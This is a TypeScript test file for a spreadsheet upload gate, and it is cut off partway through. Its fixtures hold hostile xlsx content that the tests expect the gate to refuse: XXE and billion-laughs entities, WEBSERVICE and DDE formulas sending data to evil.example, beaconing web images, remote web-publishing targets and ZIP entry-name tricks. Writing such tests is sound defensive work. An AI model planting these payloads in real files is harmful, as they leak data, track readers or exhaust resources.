const DRAWING_NS = 'http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing';
const VML_NAMESPACES =
  'xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" ' +
  'xmlns:x="urn:schemas-microsoft-com:office:excel"';
const WORKBOOK_WITH_ONE_SHEET_START =
  `${XML_DECLARATION}<workbook xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_REL}">` +
  '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>';

/** A worksheet with one numeric cell, whose root holds `after` after its sheet data. */
function sheetWithAfter(after: string): string {
  return (
    `${XML_DECLARATION}<worksheet xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_REL}">` +
    `<sheetData><row r="1"><c r="A1"><v>1</v></c></row></sheetData>${after}</worksheet>`
  );
}

/** A worksheet whose one cell holds the formula `formula` (XML text). */
function sheetWithFormula(formula: string): string {
  return sheetWithAfter('').replace('<v>1</v>', `<f>${formula}</f><v>0</v>`);
}

/** The one-sheet workbook whose sheet is `sheetXml`, plus `parts`. */
function bookWith(sheetXml: string, parts: Readonly<Record<string, string>> = {}): Buffer {
  return buildXlsxFixture([{ name: 'Sheet1', xml: sheetXml }], parts);
}

/** `text` encoded UTF-16LE after a byte order mark. */
function utf16WithMark(text: string): Uint8Array<ArrayBuffer> {
  return Uint8Array.from(Buffer.from(`${BYTE_ORDER_MARK}${text}`, 'utf16le'));
}

/**
 * The gate's error for `file` has `code`, `meta.reason` and `meta.entry`, and, for
 * UNSAFE_CONTENT, `meta.detail`: exactly `detail` when given, else any one of
 * UNSAFE_CONTENT_DETAILS.
 */
function expectGateEntry(
  file: Buffer,
  code: SpreadsheetFileErrorCode,
  reason: string,
  entry: string,
  detail?: UnsafeContentDetail,
): void {
  const err = catchGuard(file, opts);
  expect(err?.code).toBe(code);
  if (code !== 'UNSAFE_CONTENT') {
    expect(err?.meta).toEqual({ reason, entry });
    return;
  }
  expect(err?.meta).toEqual({ reason, detail: detail ?? expect.any(String), entry });
  expect(isUnsafeContentDetail(err?.meta['detail'])).toBe(true);
}

const EVIL_SHEET_XML = sheetWithFormula(EVIL_CALL);

// The gate keeps and scans every entry whose content is XML, whatever its name: an
// opener finds a part by its relationship, and the export hands every entry on.
describe('upload gate: parts chosen by content', () => {
  it.each([
    'xl/worksheets/sheet2.bin',
    'xl/worksheets/sheet2.XML',
    'xl/worksheets/sheet2.xml.bak',
    'xl/worksheets/sheet2',
  ])('refuses a formula in a worksheet stored as %s, named by the Strict type', (entry) => {
    const file = workbookWith(
      [SHEET_RELATIONSHIP, [STRICT_WORKSHEET_REL, entry.slice('xl/'.length)]],
      { [entry]: EVIL_SHEET_XML },
    );
    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA, entry);
  });

  it.each(['xl/worksheets/Sheet1.XML', 'xl/worksheets/sheet1.XML'])(
    'refuses a formula in %s beside the worksheet the reader opens',
    (entry) => {
      const file = buildXlsxFixture([BASIC_SHEET], { [entry]: EVIL_SHEET_XML });
      expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA, entry);
    },
  );

  it('refuses a DOCTYPE in a VML drawing as UNSAFE_CONTENT', () => {
    const vml = `<xml ${VML_NAMESPACES}><!DOCTYPE x [<!ENTITY e SYSTEM "http://evil.example/">]><v:shape id="b"/></xml>`;
    const file = buildXlsxFixture([BASIC_SHEET], { 'xl/drawings/vmlDrawing1.vml': vml });
    expect(catchGuard(file, opts)?.code).toBe('UNSAFE_CONTENT');
  });

  it('refuses a billion-laughs theme stored as .dat as UNSAFE_CONTENT', () => {
    const theme =
      `${XML_DECLARATION}<!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]>` +
      '<a:theme xmlns:a="urn:a">&b;</a:theme>';
    const file = buildXlsxFixture([BASIC_SHEET], { 'xl/theme/theme1.dat': theme });
    expect(catchGuard(file, opts)?.code).toBe('UNSAFE_CONTENT');
  });

  it('refuses a worksheet stored as .bin in UTF-16 with a DOCTYPE as CORRUPT_FILE part-encoding', () => {
    const entry = 'xl/worksheets/sheet3.bin';
    const xml = EVIL_SHEET_XML.replace(
      XML_DECLARATION,
      '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY a SYSTEM "http://evil.example/">]>',
    );
    const file = rezipped(
      workbookWith([SHEET_RELATIONSHIP, [STRICT_WORKSHEET_REL, 'worksheets/sheet3.bin']]),
      (entries) => ({ ...entries, [entry]: utf16WithMark(xml) }),
    );
    expectGateEntry(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PART_ENCODING, entry);
  });

  it('refuses a UTF-16 relationships part of a chart stored as .bin as CORRUPT_FILE part-encoding', () => {
    const entry = 'xl/charts/_rels/chart1.bin.rels';
    const rels = relsXml([[`${OFFICE_REL}/oleObject`, 'x.bin']]).replace(
      'encoding="UTF-8"',
      'encoding="UTF-16"',
    );
    const file = rezipped(buildXlsxFixture([BASIC_SHEET]), (entries) => ({
      ...entries,
      [entry]: utf16WithMark(rels),
    }));
    expectGateEntry(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PART_ENCODING, entry);
  });

  it('refuses a UTF-7 relationships part of a chart stored as .bin as CORRUPT_FILE package-part', () => {
    const rels = relsXml([[`${OFFICE_REL}/oleObject`, 'x.bin']]).replace(
      XML_DECLARATION,
      UTF7_DECLARATION,
    );
    const file = buildXlsxFixture([BASIC_SHEET], {
      'xl/charts/_rels/chart1.bin.rels': utf7Markup(rels).replace(
        utf7Markup(UTF7_DECLARATION),
        UTF7_DECLARATION,
      ),
    });
    expectGateReason(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PACKAGE_PART);
  });

  it.each(['xl/drawings/vmlDrawing1.vml', 'xl/x/a.xml', 'xl/x/_rels/a.bin.rels'])(
    'refuses %s holding no XML as CORRUPT_FILE part-encoding',
    (entry) => {
      const file = buildXlsxFixture([BASIC_SHEET], { [entry]: 'not xml' });
      expectGateEntry(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PART_ENCODING, entry);
    },
  );

  it('accepts an SVG image and a binary entry', () => {
    const file = buildXlsxFixture([BASIC_SHEET], {
      'xl/media/image1.svg': '<svg xmlns="http://www.w3.org/2000/svg"/>',
      'xl/printerSettings/printerSettings1.bin': 'binary',
    });
    expect(catchGuard(file, opts)).toBeNull();
  });

  // Text that starts with '=', '+', '-' or '@' is a string in xlsx: shown, never evaluated.
  it('accepts cell text that looks like a formula', () => {
    const sheet = sheetWithAfter('').replace(
      '<c r="A1"><v>1</v></c>',
      '<c r="A1" t="inlineStr"><is><t>=WEBSERVICE("http://evil.example/?"&amp;B1)</t></is></c>' +
        `<c r="B1" t="str"><v>=${DDE_LINK}</v></c>`,
    );
    expect(catchGuard(bookWith(sheet), opts)).toBeNull();
  });
});

/** A drawing part whose one anchor holds `shape`. */
function drawingWith(shape: string): string {
  return (
    `${XML_DECLARATION}<xdr:wsDr xmlns:xdr="${DRAWING_NS}" xmlns:r="${OFFICE_REL}">` +
    `<xdr:twoCellAnchor>${shape}</xdr:twoCellAnchor></xdr:wsDr>`
  );
}

const MS_RICH_DATA_REL = 'http://schemas.microsoft.com/office/2017/06/relationships';
const RICH_DATA_NS = 'http://schemas.microsoft.com/office/spreadsheetml/2017/richdata';
const WEB_IMAGE_NS = 'http://schemas.microsoft.com/office/spreadsheetml/2020/richdatawebimage';
const RICH_VALUE_CONTENT_TYPE = 'application/vnd.ms-excel.rdrichvalue';
const CONTENT_TYPES_PART = '[Content_Types].xml';

/**
 * The workbook a rich-data web image cell is stored in (cell A1 shows a picture Excel
 * loads from its address), the rich-data parts in `xl/<folder>`.
 */
function richDataWebImageBook(folder: string): Buffer {
  const dir = `xl/${folder}`;
  const contentTypes =
    `${XML_DECLARATION}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">` +
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
    '<Default Extension="xml" ContentType="application/xml"/>' +
    '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>' +
    '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>' +
    '<Override PartName="/xl/metadata.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheetMetadata+xml"/>' +
    `<Override PartName="/${dir}/rdrichvalue.xml" ContentType="${RICH_VALUE_CONTENT_TYPE}+xml"/>` +
    `<Override PartName="/${dir}/rdrichvaluestructure.xml" ContentType="${RICH_VALUE_CONTENT_TYPE}structure+xml"/>` +
    `<Override PartName="/${dir}/rdRichValueWebImage.xml" ContentType="${RICH_VALUE_CONTENT_TYPE}webimage+xml"/></Types>`;
  const external = ' TargetMode="External"/>';
  return workbookWith(
    [
      SHEET_RELATIONSHIP,
      [`${OFFICE_REL}/sheetMetadata`, 'metadata.xml'],
      [`${MS_RICH_DATA_REL}/rdRichValue`, `${folder}/rdrichvalue.xml`],
      [`${MS_RICH_DATA_REL}/rdRichValueStructure`, `${folder}/rdrichvaluestructure.xml`],
      [
        'http://schemas.microsoft.com/office/2020/07/relationships/rdRichValueWebImage',
        `${folder}/rdRichValueWebImage.xml`,
      ],
    ],
    {
      [CONTENT_TYPES_PART]: contentTypes,
      [SHEET_PART]: sheetWithAfter('').replace('<c r="A1">', '<c r="A1" t="e" vm="1">'),
      'xl/metadata.xml':
        `${XML_DECLARATION}<metadata xmlns="${SPREADSHEET_NS}" xmlns:xlrd="${RICH_DATA_NS}">` +
        '<metadataTypes count="1"><metadataType name="XLRICHVALUE" minSupportedVersion="120000"/></metadataTypes>' +
        '<futureMetadata name="XLRICHVALUE" count="1"><bk><extLst><ext uri="{3e2802c4-a4d2-4d8b-9148-e3be6c30e623}"><xlrd:rvb i="0"/></ext></extLst></bk></futureMetadata>' +
        '<valueMetadata count="1"><bk><rc t="1" v="0"/></bk></valueMetadata></metadata>',
      [`${dir}/rdrichvaluestructure.xml`]: `${XML_DECLARATION}<rvStructures xmlns="${RICH_DATA_NS}" count="1"><s t="_webimage"><k n="WebImageIdentifier" t="i"/><k n="CalcOrigin" t="i"/></s></rvStructures>`,
      [`${dir}/rdrichvalue.xml`]: `${XML_DECLARATION}<rvData xmlns="${RICH_DATA_NS}" count="1"><rv s="0"><v>0</v><v>5</v></rv></rvData>`,
      [`${dir}/rdRichValueWebImage.xml`]: `${XML_DECLARATION}<webImagesSrd xmlns="${WEB_IMAGE_NS}" xmlns:r="${OFFICE_REL}"><webImageSrd><address r:id="rId1"/><moreImagesAddress r:id="rId2"/></webImageSrd></webImagesSrd>`,
      [`${dir}/_rels/rdRichValueWebImage.xml.rels`]: relsXml([
        [HYPERLINK_REL, 'https://evil.example/pixel.png?who=opened'],
        [HYPERLINK_REL, 'https://evil.example/more'],
      ]).replaceAll('"/>', `"${external}`),
    },
  );
}

// Every field Excel evaluates as a formula, in every XML part, and the elements of
// embedded objects, controls and web publishing, wherever they stand.
describe('upload gate: formula fields and active elements of every part', () => {
  it.each<[label: string, entry: string, file: Buffer]>([
    [
      'a defined name calling WEBSERVICE',
      WORKBOOK_PART,
      bookWith(EVIL_SHEET_XML.replace(EVIL_CALL, '1'), {
        [WORKBOOK_PART]: `${WORKBOOK_WITH_ONE_SHEET_START}<definedNames><definedName name="leak">${EVIL_CALL}</definedName></definedNames></workbook>`,
      }),
    ],
    [
      'a defined name holding a DDE link',
      WORKBOOK_PART,
      bookWith(sheetWithAfter(''), {
        [WORKBOOK_PART]: `${WORKBOOK_WITH_ONE_SHEET_START}<definedNames><definedName name="pwn">${DDE_LINK}</definedName></definedNames></workbook>`,
      }),
    ],
    [
      'a data validation formula',
      SHEET_PART,
      bookWith(
        sheetWithAfter(
          `<dataValidations count="1"><dataValidation type="custom" sqref="A1"><formula1>ISNUMBER(${EVIL_CALL})</formula1></dataValidation></dataValidations>`,
        ),
      ),
    ],
    [
      'a conditional format formula',
      SHEET_PART,
      bookWith(
        sheetWithAfter(
          `<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>${DDE_LINK}</formula></cfRule></conditionalFormatting>`,
        ),
      ),
    ],
    [
      'a table calculated column formula',
      'xl/tables/table1.xml',
      bookWith(sheetWithAfter(''), {
        'xl/tables/table1.xml': `${XML_DECLARATION}<table xmlns="${SPREADSHEET_NS}" id="1" name="T" displayName="T" ref="A1:A2"><tableColumns count="1"><tableColumn id="1" name="c"><calculatedColumnFormula>${EVIL_CALL}</calculatedColumnFormula></tableColumn></tableColumns></table>`,
      }),
    ],
    [
      'a chart series DDE link',
      'xl/charts/chart1.xml',
      bookWith(sheetWithAfter(''), {
        'xl/charts/chart1.xml': `${XML_DECLARATION}<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"><c:chart><c:plotArea><c:barChart><c:ser><c:val><c:numRef><c:f>${DDE_LINK}</c:f></c:numRef></c:val></c:ser></c:barChart></c:plotArea></c:chart></c:chartSpace>`,
      }),
    ],
    [
      'a pivot cache calculated field',
      'xl/pivotCache/pivotCacheDefinition1.xml',
      bookWith(sheetWithAfter(''), {
        'xl/pivotCache/pivotCacheDefinition1.xml': `${XML_DECLARATION}<pivotCacheDefinition xmlns="${SPREADSHEET_NS}" refreshOnLoad="1"><cacheFields count="1"><cacheField name="x" formula="${EVIL_CALL}" databaseField="0"/></cacheFields></pivotCacheDefinition>`,
      }),
    ],
    [
      'a shape macro and text link',
      'xl/drawings/drawing1.xml',
      bookWith(sheetWithAfter(''), {
        'xl/drawings/drawing1.xml': drawingWith(
          `<xdr:sp macro="${DDE_LINK}" textlink="${EVIL_CALL}"/>`,
        ),
      }),
    ],
    [
      'a form control macro',
      'xl/ctrlProps/ctrlProp1.xml',
      bookWith(sheetWithAfter(''), {
        'xl/ctrlProps/ctrlProp1.xml': `${XML_DECLARATION}<formControlPr xmlns="urn:x14" objectType="Button" fmlaMacro="${EVIL_CALL}" fmlaLink="${DDE_LINK}"/>`,
      }),
    ],
    [
      'a VML button macro and cell link',
      'xl/drawings/vmlDrawing1.vml',
      bookWith(sheetWithAfter(''), {
        'xl/drawings/vmlDrawing1.vml': `<xml ${VML_NAMESPACES}><v:shape id="b"><x:ClientData ObjectType="Button"><x:FmlaMacro>${EVIL_CALL}</x:FmlaMacro><x:FmlaLink>${DDE_LINK}</x:FmlaLink></x:ClientData></v:shape></xml>`,
      }),
    ],
    [
      'a formula in a second root element',
      'xl/worksheets/sheet7.xml',
      bookWith(sheetWithAfter(''), {
        'xl/worksheets/sheet7.xml': `${XML_DECLARATION}<x/>${EVIL_SHEET_XML.slice(XML_DECLARATION.length)}`,
      }),
    ],
  ])('refuses %s as UNSAFE_CONTENT unsafe-formula', (_label, entry, file) => {
    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA, entry);
  });

  it.each<[label: string, entry: string, file: Buffer]>([
    [
      'an oleObject named through an image relationship',
      SHEET_PART,
      bookWith(
        sheetWithAfter(
          '<oleObjects><oleObject progId="Package" dvAspect="DVASPECT_ICON" shapeId="1025" r:id="rId1" oleUpdate="OLEUPDATE_ALWAYS" autoLoad="1"/></oleObjects>',
        ),
        {
          [SHEET_RELS_PART]: relsXml([[`${OFFICE_REL}/image`, '../media/ole1.bin']]),
          'xl/media/ole1.bin': 'binary',
        },
      ),
    ],
    [
      'an oleObject link attribute',
      SHEET_PART,
      bookWith(
        sheetWithAfter(
          `<oleObjects><oleObject progId="Package" link="${DDE_LINK}" shapeId="1025"/></oleObjects>`,
        ),
      ),
    ],
    [
      'a form control',
      SHEET_PART,
      bookWith(
        sheetWithAfter(
          '<controls><control shapeId="1025" r:id="rId1" name="Button 1"/></controls>',
        ),
      ),
    ],
    [
      'a web publishing item that republishes to a file share',
      SHEET_PART,
      bookWith(
        sheetWithAfter(
          '<webPublishItems count="1"><webPublishItem id="1" divId="d" sourceType="sheet" destinationFile="\\\\evil.example\\s\\x.htm" autoRepublish="1"/></webPublishItems>',
        ),
      ),
    ],
    [
      'a web publishing object that republishes to a web address',
      WORKBOOK_PART,
      bookWith(sheetWithAfter(''), {
        [WORKBOOK_PART]: `${WORKBOOK_WITH_ONE_SHEET_START}<webPublishing allowPng="1"/><webPublishObjects count="1"><webPublishObject id="1" divId="d" sourceObject="Sheet1!A1:Z99" destinationFile="http://evil.example/drop.htm" autoRepublish="1"/></webPublishObjects></workbook>`,
      }),
    ],
  ])('refuses %s as UNSAFE_CONTENT unsafe-part', (_label, entry, file) => {
    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART, entry);
  });

  // A cell value a rich-data web image shows, with no formula: the address is an
  // external hyperlink-typed relationship, which only a worksheet's click may follow.
  it('refuses a rich-data web image as UNSAFE_CONTENT unsafe-part', () => {
    const imageRels = 'xl/richData/_rels/rdRichValueWebImage.xml.rels';
    const file = bookWith(sheetWithAfter('').replace('<c r="A1">', '<c r="A1" t="e" vm="1">'), {
      'xl/richData/rdRichValueWebImage.xml': `${XML_DECLARATION}<webImagesSrd xmlns="urn:wi" xmlns:r="${OFFICE_REL}"><webImageSrd><address r:id="rId1"/></webImageSrd></webImagesSrd>`,
      [imageRels]: relsXml([[HYPERLINK_REL, 'https://evil.example/pixel.png?who=opened']]).replace(
        '/>',
        ' TargetMode="External"/>',
      ),
    });
    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART, imageRels);
  });

  // The whole rich-data web image Excel writes, in its own folder and moved beside the
  // worksheets: the hyperlink exception follows the part's content, not its path.
  it.each(['richData', 'worksheets'])(
    'refuses a whole rich-data web image package stored in xl/%s as UNSAFE_CONTENT unsafe-part',
    (folder) => {
      const imageRels = `xl/${folder}/_rels/rdRichValueWebImage.xml.rels`;
      expectGateEntry(
        richDataWebImageBook(folder),
        'UNSAFE_CONTENT',
        UNSAFE_CONTENT_REASONS.UNSAFE_PART,
        imageRels,
      );
    },
  );

  it('refuses XML maps bound to a remote file as UNSAFE_CONTENT unsafe-part', () => {
    const file = workbookWith([SHEET_RELATIONSHIP, [`${OFFICE_REL}/xmlMaps`, 'xmlMaps.xml']], {
      'xl/xmlMaps.xml':
        `${XML_DECLARATION}<MapInfo xmlns="${SPREADSHEET_NS}" SelectionNamespaces=""><Schema ID="Schema1">` +
        '<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema"><xsd:import namespace="urn:x" schemaLocation="https://evil.example/s.xsd"/>' +
        '<xsd:element name="root"/></xsd:schema></Schema>' +
        '<Map ID="1" Name="root_Map" RootElement="root" SchemaID="Schema1"><DataBinding FileBinding="true" FileBindingName="https://evil.example/data.xml" DataBindingLoadMode="1"/></Map></MapInfo>',
    });
    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART, WORKBOOK_RELS_PART);
  });

  it('refuses a picture whose click opens an external hyperlink of its drawing', () => {
    const drawingRels = 'xl/drawings/_rels/drawing1.xml.rels';
    const file = bookWith(sheetWithAfter('<drawing r:id="rId1"/>'), {
      [SHEET_RELS_PART]: relsXml([[DRAWING_REL, '../drawings/drawing1.xml']]),
      'xl/drawings/drawing1.xml': drawingWith(
        '<xdr:pic macro=""><xdr:nvPicPr><xdr:cNvPr id="2" name="p"><a:hlinkClick xmlns:a="urn:a" r:id="rId1"/></xdr:cNvPr></xdr:nvPicPr></xdr:pic>',
      ),
      [drawingRels]: relsXml([[HYPERLINK_REL, 'https://example.com/a']]).replace(
        '/>',
        ' TargetMode="External"/>',
      ),
    });
    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART, drawingRels);
  });

  it('accepts an external https hyperlink of a worksheet cell', () => {
    const file = bookWith(
      sheetWithAfter('<hyperlinks><hyperlink ref="A1" r:id="rId1"/></hyperlinks>'),
      {
        [SHEET_RELS_PART]: relsXml([[HYPERLINK_REL, 'https://www.trendyol.com/x']]).replace(
          '/>',
          ' TargetMode="External"/>',
        ),
      },
    );
    expect(catchGuard(file, opts)).toBeNull();
  });

  it("accepts Excel's empty macro and text link on a shape, and the 3ve4 data validation", () => {
    const file = bookWith(
      sheetWithAfter(
        '<dataValidations count="1"><dataValidation type="list" sqref="T2:T34" allowBlank="true"><formula1>OFFSET($Z2,0,0,1,COUNTA($Z2:$AB2))</formula1></dataValidation></dataValidations>',
      ),
      { 'xl/drawings/drawing1.xml': drawingWith('<xdr:sp macro="" textlink=""/>') },
    );
    expect(catchGuard(file, opts)).toBeNull();
  });
});

// ECMA-376 Part 2 interleaving: a packaging reader that joins `name/[0].piece` ...
// `name/[n].last.piece` (in any ASCII case) into one part `name` reads a part the gate
// never saw whole.
const FIRST_PIECE = '/[0].piece';
const LAST_PIECE = '/[1].last.piece';
const SECOND_SHEET_PART = 'xl/worksheets/sheet2.xml';
const OLE_OBJECT_REL = `${OFFICE_REL}/oleObject`;
// The general purpose flag that marks a UTF-8 entry name (bit 11).
const UTF8_NAME_FLAG = 0x0800;
// LATIN SMALL LETTER LONG S: a reader that folds names in Unicode reads it as 's'.
const LONG_S = String.fromCodePoint(0x17f);

/** `text` split after its first '<' into the two pieces of part `name`. */
function pieces(name: string, text: string): Record<string, string> {
  const at = text.indexOf('<') + 1;
  return {
    [`${name}${FIRST_PIECE}`]: text.slice(0, at),
    [`${name}${LAST_PIECE}`]: text.slice(at),
  };
}

const PIECED_SHEET_RELS = relsXml([[OLE_OBJECT_REL, '../embeddings/oleObject1.bin']]);
const STRICT_SECOND_SHEET_RELS = relsXml([
  SHEET_RELATIONSHIP,
  [STRICT_WORKSHEET_REL, 'worksheets/sheet2.xml'],
]);
const TWO_SHEET_WORKBOOK = `${WORKBOOK_WITH_ONE_SHEET_START.replace(
  '</sheets>',
  '<sheet name="Sheet2" sheetId="2" r:id="rId2"/></sheets>',
)}</workbook>`;
const OTHER_WORKBOOK = `${WORKBOOK_WITH_ONE_SHEET_START}<definedNames><definedName name="x">${EVIL_CALL}</definedName></definedNames></workbook>`;

/** The one-sheet workbook with its root relationships naming xl/other.xml, both in pieces. */
function piecedRootRelsBook(): Buffer {
  const pieced = {
    ...pieces(ROOT_RELS_PART, relsXml([[OFFICE_DOCUMENT_REL, OTHER_PART]])),
    ...pieces(OTHER_PART, OTHER_WORKBOOK),
    'xl/_rels/other.xml.rels': relsXml([SHEET_RELATIONSHIP]),
  };
  return rezipped(buildXlsxFixture([BASIC_SHEET]), (entries) => ({
    ...Object.fromEntries(Object.entries(entries).filter(([name]) => name !== ROOT_RELS_PART)),
    ...Object.fromEntries(Object.entries(pieced).map(([name, text]) => [name, strToU8(text)])),
  }));
}

describe('upload gate: entry names', () => {
  it('refuses the pieces of a worksheet rels part whose whole is UNSAFE_CONTENT', () => {
    const sheet = sheetWithAfter('<picture r:id="rId1"/>');
    expectGateReason(
      bookWith(sheet, { [SHEET_RELS_PART]: PIECED_SHEET_RELS }),
      'UNSAFE_CONTENT',
      UNSAFE_CONTENT_REASONS.UNSAFE_PART,
    );
    expectGateEntry(
      bookWith(sheet, pieces(SHEET_RELS_PART, PIECED_SHEET_RELS)),
      'CORRUPT_FILE',
      ZIP_REJECT_REASONS.ENTRY_NAME,
      `${SHEET_RELS_PART}${FIRST_PIECE}`,
    );
  });

  it('refuses the pieces of a WEBSERVICE worksheet named by the Strict type', () => {
    const parts = {
      [WORKBOOK_RELS_PART]: STRICT_SECOND_SHEET_RELS,
      [WORKBOOK_PART]: TWO_SHEET_WORKBOOK,
    };
    expectGateReason(
      bookWith(sheetWithAfter(''), { ...parts, [SECOND_SHEET_PART]: EVIL_SHEET_XML }),
      'UNSAFE_CONTENT',
      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
    );
    expectGateEntry(
      bookWith(sheetWithAfter(''), { ...parts, ...pieces(SECOND_SHEET_PART, EVIL_SHEET_XML) }),
      'CORRUPT_FILE',
      ZIP_REJECT_REASONS.ENTRY_NAME,
      `${SECOND_SHEET_PART}${FIRST_PIECE}`,
    );
  });

  it('refuses root relationships in pieces that name another workbook in pieces', () => {
    expectGateEntry(
      piecedRootRelsBook(),
      'CORRUPT_FILE',
      ZIP_REJECT_REASONS.ENTRY_NAME,
      `${ROOT_RELS_PART}${FIRST_PIECE}`,
    );
  });

  it.each<[string, string]>([
    ['an upper-case piece', `${SHEET_RELS_PART}/[0].PIECE`],
    ['a backslash', 'xl\\vbaProject.bin'],
    ['a backslash in the root relationships name', '_rels\\.rels'],
    ['a leading slash', `/${ROOT_RELS_PART}`],
    ['an empty segment', 'xl//worksheets/sheet2.xml'],
    ['a parent segment', 'xl/worksheets/../x.xml'],
    ['a current segment', 'xl/./x.xml'],
    ['a percent escape', '_rels/%2Erels'],
    ['a long s that folds to s', `${SHEET_RELS_PART.slice(0, -1)}${LONG_S}`],
    ['a space', 'xl/media/image 1.png'],
  ])('refuses an entry name with %s as CORRUPT_FILE entry-name', (_label, name) => {
    expectGateEntry(
      buildXlsxFixture([BASIC_SHEET], { [name]: '<x/>' }),
      'CORRUPT_FILE',
      ZIP_REJECT_REASONS.ENTRY_NAME,
      name,
    );
  });

  it('accepts a name made of every character the rule allows', () => {
    const file = buildXlsxFixture([BASIC_SHEET], { 'xl/media/Image-1_a~b.c.png': 'png' });
    expect(catchGuard(file, opts)).toBeNull();
  });

  it('accepts an empty folder entry and refuses one that carries bytes', () => {
    expect(catchGuard(buildXlsxFixture([BASIC_SHEET], { 'xl/media/': '' }), opts)).toBeNull();
    // Stored (method 0), the way most zip tools write a folder.
    const storedFolder = storedZip([...MINIMAL_PARTS, { name: 'xl/media/', text: '' }]);
    expect(catchGuard(storedFolder, opts)).toBeNull();
    expectGateEntry(
      buildXlsxFixture([BASIC_SHEET], { 'xl/media/': 'x' }),
      'CORRUPT_FILE',
      ZIP_REJECT_REASONS.ENTRY_NAME,
      'xl/media/',
    );
  });

  it('refuses a UTF-8 name whose leading byte order mark the stream drops', () => {
    const file = storedZip([
      ...MINIMAL_PARTS,
      { name: `${BYTE_ORDER_MARK}xl/x.xml`, text: '<x/>', flags: UTF8_NAME_FLAG },
    ]);
    // The name the layout and the stream decode is canonical; its bytes are not.
    expect(readZipLayout(file).entries.map((entry) => entry.name)).toContain('xl/x.xml');
    expectGateEntry(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.ENTRY_NAME, 'xl/x.xml');
  });

  it('refuses a bad name before inflating anything', () => {
    const file = buildXlsxFixture([BASIC_SHEET], { 'xl\\x.bin': '0'.repeat(BOMB_BYTES) });
    const err = catchGuard(file, { ...opts, maxDecompressedBytes: BOMB_CAP });
    expect(err?.code).toBe('CORRUPT_FILE');
    expect(err?.meta).toMatchObject({ reason: ZIP_REJECT_REASONS.ENTRY_NAME });
  });
});

// readZipLayout refuses every archive that would break the backstop before the stream
// runs (the central directory tests above), so it is tested on the stream alone.
describe('upload gate: the stream meets the entries the directory lists', () => {
  const valid = storedZip(MINIMAL_PARTS);
  const listed = readZipLayout(valid).entries.length;

  it('passes a stream that meets every listed entry once', () => {
    expect(() => streamArchive(valid, listed, MAX_DECOMPRESSED_BYTES)).not.toThrow();
  });

  it('refuses a name the stream meets twice as CORRUPT_FILE zip-view-mismatch', () => {
    const twice = storedZip([...MINIMAL_PARTS, { name: 'xl/extra.xml', text: 'again' }]);
    expectGateReason(twice, 'CORRUPT_FILE', ZIP_REJECT_REASONS.LAYOUT);
    const error = fileErrorOf(() =>
      streamArchive(twice, MINIMAL_PARTS.length + 1, MAX_DECOMPRESSED_BYTES),
    );
    expect(error.code).toBe('CORRUPT_FILE');
    expect(error.meta).toEqual({
      reason: ZIP_REJECT_REASONS.VIEW_MISMATCH,
      entry: 'xl/extra.xml',
    });
  });

  it.each([
    ['fewer', 1],
    ['more', -1],
  ])('refuses a stream that meets %s entries than listed as CORRUPT_FILE', (_label, offset) => {
    const error = fileErrorOf(() => streamArchive(valid, listed + offset, MAX_DECOMPRESSED_BYTES));
    expect(error.code).toBe('CORRUPT_FILE');
    expect(error.meta).toEqual({
      reason: ZIP_REJECT_REASONS.VIEW_MISMATCH,
      streamed: listed,
      listed: listed + offset,
    });
  });
});

// A stored deflate block (BTYPE 00) declares its length twice: LEN, then NLEN, its one's
// complement. fflate's stream inflates the block whatever NLEN holds; zlib refuses one
// whose NLEN is wrong, as other inflaters may.
const FINAL_STORED_BLOCK = 0x01;
const SIXTEEN_BITS = 0xffff;
const WRONG_NLEN = 0;
const OTHER_XML_PART = 'xl/x/a.xml';
const OTHER_XML = '<a/>';

/** One final stored deflate block holding `content`; NLEN is `nlen`, its right value by default. */
function storedDeflateBlock(content: Uint8Array, nlen = ~content.length & SIXTEEN_BITS): Buffer {
  return Buffer.concat([
    Buffer.from([FINAL_STORED_BLOCK]),
    u16(content.length),
    u16(nlen),
    content,
  ]);
}

/** The content of entry `name` of `file`. */
function entryBytes(file: Buffer, name: string): Uint8Array {
  const bytes = unzipSync(new Uint8Array(file))[name];
  if (bytes === undefined) throw new Error(`entry missing: ${name}`);
  return bytes;
}

describe('upload gate: every kept XML part is the directory entry zlib inflates', () => {
  const book = buildXlsxFixture([BASIC_SHEET], { [OTHER_XML_PART]: OTHER_XML });

  it('accepts a part the reader never opens written as a valid stored block', () => {
    const data = storedDeflateBlock(strToU8(OTHER_XML));
    expect(catchGuard(rawDeflateArchive(book, OTHER_XML_PART, data), opts)).toBeNull();
  });

  it.each([
    ['a part the reader never opens', OTHER_XML_PART],
